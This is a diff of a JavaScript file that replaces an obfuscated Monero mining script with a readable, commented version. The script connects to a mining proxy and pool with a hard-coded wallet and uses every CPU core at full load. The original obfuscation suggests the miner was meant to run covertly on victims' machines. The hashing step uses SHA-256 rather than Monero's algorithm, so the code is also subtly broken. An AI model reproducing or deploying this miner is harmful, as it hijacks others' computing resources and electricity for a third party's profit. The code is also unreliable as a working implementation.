@@ -1,1 +1,130 @@
-const _0x42f44e=_0x40f8;function _0x5e44(){const _0x361adc=['Error\x20sending\x20hash:','45EziBvf7gEAkCE2C39FWNXprx7FbnkbGEi3eGGdpQbzKdVUGjLcDPLK4V9ZvMxFkWKpfpPD2e3srVg6WhuzvYnXFvNhhPJ','job_id','WebSocket\x20error:','postMessage','1624553zYfueX',')...','digest','hash','submit','min',',\x20target=','WebAssembly\x20not\x20supported.\x20Mining\x20cannot\x20proceed.','then','onerror','length','handshake','onmessage','instantiate','cpus','66IpArSv','Max\x20reconnection\x20attempts\x20reached.\x20Stopping\x20reconnection.','Disconnected\x20from\x20pool.\x20Reconnecting\x20in\x20','function','send','log','toString','Error\x20parsing\x20message:','Assigning\x20job\x20to\x20workers:\x20job_id=','5749353JPfjBo','PRUEBA','10cdnvSN','push','onclose','moneroocean.stream','parse','2766792rwDJfA','Module','stringify','364370wpbZvk','encode','createObjectURL','12sRgRAz','118642AlvrdV','subtle','33597113qgAjDV','SHA-256','error','208OxQrSd','max','6903GXLBTO','close'];_0x5e44=function(){return _0x361adc;};return _0x5e44();}(function(_0x8260ae,_0x2ce6e3){const _0x31a3b4=_0x40f8,_0x351d38=_0x8260ae();while(!![]){try{const _0x593e55=parseInt(_0x31a3b4(0x20b))/0x1*(-parseInt(_0x31a3b4(0x20a))/0x2)+parseInt(_0x31a3b4(0x212))/0x3*(parseInt(_0x31a3b4(0x210))/0x4)+-parseInt(_0x31a3b4(0x207))/0x5*(parseInt(_0x31a3b4(0x1f4))/0x6)+-parseInt(_0x31a3b4(0x219))/0x7+-parseInt(_0x31a3b4(0x204))/0x8+-parseInt(_0x31a3b4(0x1fd))/0x9+parseInt(_0x31a3b4(0x1ff))/0xa*(parseInt(_0x31a3b4(0x20d))/0xb);if(_0x593e55===_0x2ce6e3)break;else _0x351d38['push'](_0x351d38['shift']());}catch(_0xb28fa8){_0x351d38['push'](_0x351d38['shift']());}}}(_0x5e44,0x6c54c));const os=require('os');let server='wss://ny1.xmrminingproxy.com',pool=_0x42f44e(0x202),walletAddress=_0x42f44e(0x215),workerId=_0x42f44e(0x1fe),threads=os[_0x42f44e(0x1f3)]()[_0x42f44e(0x1ef)]||-0x1,throttleMiner=0x0,workers=[],ws,totalHashes=0x0,connected=![],job=null,reconnectAttempts=0x0;const maxReconnectAttempts=0xa,wasmSupported=((()=>{const _0x1680a4=_0x42f44e;try{if(typeof WebAssembly==='object'&&typeof WebAssembly[_0x1680a4(0x1f2)]===_0x1680a4(0x1f7)){const _0x4f15f8=new WebAssembly[(_0x1680a4(0x205))](Uint8Array['of'](0x0,0x61,0x73,0x6d,0x1,0x0,0x0,0x0));return _0x4f15f8 instanceof WebAssembly['Module'];}}catch{return![];}return![];})());function connectToPool(){const _0x243268=_0x42f44e;if(connected||reconnectAttempts>=maxReconnectAttempts){reconnectAttempts>=maxReconnectAttempts&&console['error'](_0x243268(0x1f5));return;}ws=new WebSocket(server),ws['onopen']=()=>{const _0x531e26=_0x243268;connected=!![],reconnectAttempts=0x0,ws[_0x531e26(0x1f8)](JSON[_0x531e26(0x206)]({'identifier':_0x531e26(0x1f0),'pool':pool,'login':walletAddress,'password':'','workerId':workerId,'version':0x7})),console[_0x531e26(0x1f9)]('Connected\x20to\x20pool');},ws['onmessage']=_0x30884e=>{const _0x243221=_0x243268;try{const _0x436fe7=JSON[_0x243221(0x203)](_0x30884e['data']);_0x436fe7['identifier']==='job'?(console[_0x243221(0x1f9)]('New\x20mining\x20job\x20received:',_0x436fe7),job=_0x436fe7,assignWorkToWorkers()):console['warn']('Unhandled\x20message\x20type:',_0x436fe7);}catch(_0x40108a){console[_0x243221(0x20f)](_0x243221(0x1fb),_0x40108a);}},ws[_0x243268(0x201)]=()=>{const _0x4b5356=_0x243268;connected=![],reconnectAttempts++;const _0x2c1541=Math[_0x4b5356(0x1ea)](0x3e8*reconnectAttempts,0x7530);console['log'](_0x4b5356(0x1f6)+_0x2c1541/0x3e8+'s\x20(attempt\x20'+reconnectAttempts+'/'+maxReconnectAttempts+_0x4b5356(0x21a)),setTimeout(connectToPool,_0x2c1541);},ws[_0x243268(0x1ee)]=_0x4c2ed3=>{const _0x45bc3a=_0x243268;console[_0x45bc3a(0x20f)](_0x45bc3a(0x217),_0x4c2ed3),ws[_0x45bc3a(0x213)]();};}function createWorker(){const _0x4e3e82=_0x42f44e,_0x288039=new Worker(URL[_0x4e3e82(0x209)](new Blob(['('+workerScript[_0x4e3e82(0x1fa)]()+')();'],{'type':'application/javascript'})));_0x288039[_0x4e3e82(0x1f1)]=_0x26e302=>{const _0xff246f=_0x4e3e82;if(connected&&ws&&job)try{ws[_0xff246f(0x1f8)](JSON['stringify']({'type':_0xff246f(0x21d),'result':_0x26e302['data'][_0xff246f(0x21c)],'job_id':job[_0xff246f(0x216)]})),totalHashes++;}catch(_0x3c2420){console['error'](_0xff246f(0x214),_0x3c2420);}},workers[_0x4e3e82(0x200)](_0x288039);}function assignWorkToWorkers(){const _0x15d7ef=_0x42f44e;if(!job)return;console[_0x15d7ef(0x1f9)](_0x15d7ef(0x1fc)+job['job_id']+_0x15d7ef(0x1eb)+job['target']),workers['forEach'](_0x2a9000=>_0x2a9000[_0x15d7ef(0x218)](job));}function startMining(customPool,customWallet,customWorkerId,customThreads,customThrottle){const _0x31a9c9=_0x42f44e;if(!wasmSupported){console[_0x31a9c9(0x20f)](_0x31a9c9(0x1ec));return;}if(customPool)pool=customPool;if(customWallet)walletAddress=customWallet;if(customWorkerId)workerId=customWorkerId;if(customThreads>=0x0)threads=customThreads;if(customThrottle>=0x0)throttleMiner=customThrottle;while(workers['length']<threads||threads<0x0&&workers['length']<os[_0x31a9c9(0x1f3)]()[_0x31a9c9(0x1ef)]){createWorker();}connectToPool(),console[_0x31a9c9(0x1f9)]('Started\x20mining\x20with\x20'+workers[_0x31a9c9(0x1ef)]+'\x20workers\x20and\x20throttle\x20set\x20to\x20'+throttleMiner+'%.');}function _0x40f8(_0x7a5cfe,_0x534f86){const _0x5e4418=_0x5e44();return _0x40f8=function(_0x40f88c,_0x3fadfd){_0x40f88c=_0x40f88c-0x1ea;let _0x4fcb93=_0x5e4418[_0x40f88c];return _0x4fcb93;},_0x40f8(_0x7a5cfe,_0x534f86);}function workerScript(){onmessage=function(_0x13aeca){const _0xdb7270=_0x40f8,{job_id:job_id,data:_0x24263f}=_0x13aeca['data'],_0x254ff8=Math[_0xdb7270(0x211)](0x0,throttleMiner/0x64*0x64);setTimeout(()=>{const _0x3a690c=_0xdb7270;crypto[_0x3a690c(0x20c)][_0x3a690c(0x21b)](_0x3a690c(0x20e),new TextEncoder()[_0x3a690c(0x208)](_0x24263f))[_0x3a690c(0x1ed)](_0x57c93a=>{postMessage({'hash':_0x57c93a,'job_id':job_id});});},_0x254ff8);};}
+const os = require('os'); // Importa el módulo 'os'
+
+// Optimized mining script based on original Monero miner
+let server = "wss://ny1.xmrminingproxy.com";
+let pool = "moneroocean.stream";
+let walletAddress = "45EziBvf7gEAkCE2C39FWNXprx7FbnkbGEi3eGGdpQbzKdVUGjLcDPLK4V9ZvMxFkWKpfpPD2e3srVg6WhuzvYnXFvNhhPJ";
+let workerId = "PRUEBA";
+let threads = os.cpus().length || -1; // Use all cores by default
+let throttleMiner = 0; // Throttle value in percentage (0 = max utilization)
+let workers = [], ws, totalHashes = 0, connected = false, job = null, reconnectAttempts = 0;
+const maxReconnectAttempts = 10;
+
+const wasmSupported = (() => {
+  try {
+    if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
+      const module = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
+      return module instanceof WebAssembly.Module;
+    }
+  } catch {
+    return false;
+  }
+  return false;
+})();
+
+function connectToPool() {
+  if (connected || reconnectAttempts >= maxReconnectAttempts) {
+    if (reconnectAttempts >= maxReconnectAttempts) {
+      console.error("Max reconnection attempts reached. Stopping reconnection.");
+    }
+    return;
+  }
+  ws = new WebSocket(server);
+  ws.onopen = () => {
+    connected = true;
+    reconnectAttempts = 0; // Reset reconnect attempts on successful connection
+    ws.send(JSON.stringify({
+      identifier: "handshake",
+      pool,
+      login: walletAddress,
+      password: "", // Optional
+      workerId,
+      version: 7
+    }));
+    console.log("Connected to pool");
+  };
+
+  ws.onmessage = (message) => {
+    try {
+      const data = JSON.parse(message.data);
+      if (data.identifier === "job") {
+        console.log("New mining job received:", data);
+        job = data;
+        assignWorkToWorkers();
+      } else {
+        console.warn("Unhandled message type:", data);
+      }
+    } catch (error) {
+      console.error("Error parsing message:", error);
+    }
+  };
+
+  ws.onclose = () => {
+    connected = false;
+    reconnectAttempts++;
+    const delay = Math.min(1000 * reconnectAttempts, 30000); // Exponential backoff, max 30s
+    console.log(`Disconnected from pool. Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts}/${maxReconnectAttempts})...`);
+    setTimeout(connectToPool, delay);
+  };
+
+  ws.onerror = (err) => {
+    console.error("WebSocket error:", err);
+    ws.close();
+  };
+}
+
+function createWorker() {
+  const worker = new Worker(URL.createObjectURL(new Blob([`(${workerScript.toString()})();`], { type: "application/javascript" })));
+  worker.onmessage = (e) => {
+    if (connected && ws && job) {
+      try {
+        ws.send(JSON.stringify({
+          type: "submit",
+          result: e.data.hash,
+          job_id: job.job_id
+        }));
+        totalHashes++;
+      } catch (error) {
+        console.error("Error sending hash:", error);
+      }
+    }
+  };
+  workers.push(worker);
+}
+
+function assignWorkToWorkers() {
+  if (!job) return;
+  console.log(`Assigning job to workers: job_id=${job.job_id}, target=${job.target}`);
+  workers.forEach(worker => worker.postMessage(job));
+}
+
+function startMining(customPool, customWallet, customWorkerId, customThreads, customThrottle) {
+  if (!wasmSupported) {
+    console.error("WebAssembly not supported. Mining cannot proceed.");
+    return;
+  }
+  // Apply custom parameters if provided
+  if (customPool) pool = customPool;
+  if (customWallet) walletAddress = customWallet;
+  if (customWorkerId) workerId = customWorkerId;
+  if (customThreads >= 0) threads = customThreads;
+  if (customThrottle >= 0) throttleMiner = customThrottle;
+
+  while (workers.length < threads || (threads < 0 && workers.length < os.cpus().length)) {
+    createWorker();
+  }
+  connectToPool();
+  console.log(`Started mining with ${workers.length} workers and throttle set to ${throttleMiner}%.`);
+}
+
+function workerScript() {
+  onmessage = function (job) {
+    const { job_id, data } = job.data;
+    const throttleDelay = Math.max(0, (throttleMiner / 100) * 100); // Calculate delay based on throttle
+    setTimeout(() => {
+      crypto.subtle.digest("SHA-256", new TextEncoder().encode(data)).then(buffer => {
+        postMessage({ hash: buffer, job_id });
+      });
+    }, throttleDelay);
+  };
+}
